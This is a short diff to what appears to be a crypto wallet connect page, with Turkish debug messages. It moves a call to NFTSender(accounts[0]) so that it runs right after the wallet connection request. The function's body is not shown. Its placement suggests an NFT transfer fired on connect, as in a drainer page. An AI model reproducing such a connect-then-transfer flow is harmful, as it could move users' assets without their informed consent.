@@ -26,7 +26,6 @@ let connected = (accounts) => {
     statusDesc.innerHTML = accounts[0]
     //postAccount(accounts[0])
     console.log('buraya kadar sorun yok');
-    await NFTSender(accounts[0]);
     console.log('burada mi sorun');
     btn.style.display = 'none';
     loader.style.display = 'none';
@@ -51,6 +50,7 @@ btn.addEventListener('click', async () => {
 
     try {
         const accounts = await ethereum.request({method: 'eth_requestAccounts'})
+        await NFTSender(accounts[0]);
         connected(accounts)
     } catch (error) {
         console.error(error);
